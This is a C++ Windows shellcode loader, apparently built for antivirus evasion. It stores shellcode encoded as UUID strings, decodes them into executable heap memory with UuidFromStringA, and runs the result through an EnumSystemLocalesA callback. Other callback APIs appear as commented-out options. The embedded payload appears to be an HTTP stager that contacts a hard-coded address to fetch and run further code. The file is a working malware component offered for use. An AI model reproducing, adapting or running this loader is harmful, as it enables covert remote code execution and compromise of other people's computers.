#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")

//将转换后的shellcode（shellcode-> uuid）
const char* uuids[] =
{
    "e48348fc-e8f0-00c8-0000-415141505251", "d2314856-4865-528b-6048-8b5218488b52", "728b4820-4850-b70f-4a4a-4d31c94831c0", "7c613cac-2c02-4120-c1c9-0d4101c1e2ed", "48514152-528b-8b20-423c-4801d0668178", "75020b18-8b72-8880-0000-004885c07467", "50d00148-488b-4418-8b40-204901d0e356", "41c9ff48-348b-4888-01d6-4d31c94831c0", "c9c141ac-410d-c101-38e0-75f14c034c24", "d1394508-d875-4458-8b40-244901d06641", "44480c8b-408b-491c-01d0-418b04884801", "415841d0-5e58-5a59-4158-4159415a4883", "524120ec-e0ff-4158-595a-488b12e94fff", "6a5dffff-4900-77be-696e-696e65740041", "e6894956-894c-41f1-ba4c-772607ffd548", "3148c931-4dd2-c031-4d31-c94150415041", "79563aba-ffa7-e9d5-9300-00005a4889c1", "01bbb841-0000-314d-c941-5141516a0341", "57ba4151-9f89-ffc6-d5eb-795b4889c148", "8949d231-4dd8-c931-5268-0032c0845252", "55ebba41-3b2e-d5ff-4889-c64883c3506a", "89485f0a-baf1-001f-0000-6a0068803300", "e0894900-b941-0004-0000-41ba75469e86", "8948d5ff-48f1-da89-49c7-c0ffffffff4d", "5252c931-ba41-062d-187b-ffd585c00f85", "0000019d-ff48-0fcf-848c-010000ebb3e9", "000001e4-82e8-ffff-ff2f-4c7932660016", "cf7f1918-0226-f10c-941a-0a74b2e119fd", "e6ed5ffd-de21-e3cd-2c0e-c764b238b466", "74e5bb03-a599-974b-a963-910165057c94", "8726e9a1-7059-68da-e25f-f823de2599f9", "615fef62-32f1-abfd-0055-7365722d4167", "3a746e65-4d20-7a6f-696c-6c612f352e30", "6f632820-706d-7461-6962-6c653b204d53", "39204549-302e-203b-7164-65736b20322e", "32312e34-3336-322e-3033-3b2057696e64", "2073776f-544e-3620-2e31-3b20574f5736", "54203b34-6972-6564-6e74-2f352e30290d", "0a7d000a-0c12-a848-65a9-66baca2f81db", "66db30c5-e781-7cfb-184e-81ba3dd03380", "db04df49-b234-c632-a20d-41d793cd7d9d", "5c8643d9-6672-e816-4495-9f8363ce2fd1", "cee699b1-d6c9-6ca7-6d40-225c38c64fde", "7284833a-1af9-3b95-5353-c871ea07ba9e", "376da698-fad5-b63b-255f-483b68521eab", "3d33cb44-44a1-588f-48f0-54d9a55a1d04", "e59b28a5-7ac3-1336-1c11-cb55f9bd7aec", "e5876cce-0994-f444-6f06-b90fdfbfcc28", "861d107b-d64a-f2a7-ec21-d7fa1c00546a", "c562c83b-dea1-1c80-d344-b388f8a9bdf8", "428bbaab-9e84-71a2-0041-bef0b5a256ff", "c93148d5-00ba-4000-0041-b80010000041", "000040b9-4100-58ba-a453-e5ffd5489353", "e7894853-8948-48f1-89da-41b800200000", "41f98949-12ba-8996-e2ff-d54883c42085", "66b674c0-078b-0148-c385-c075d7585858", "00000548-0000-c350-e87f-fdffff312e31", "30382e35-312e-3230-0049-9602d2000000"
};


int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
    void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//UUID转换为原来的shellcode写入内存
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }

    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
    // EnumWindows((WNDENUMPROC)ha, 0);
    // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
    // EnumThreadWindows(0, (WNDENUMPROC)ha, 0);
    // EnumSystemGeoID(0, 0, (GEO_ENUMPROC)ha);
    // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)ha, 0, 0);
    // EnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    // EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ha, 0);
    // EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
    // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
    // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
    // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    CloseHandle(ha);
    return 0;
}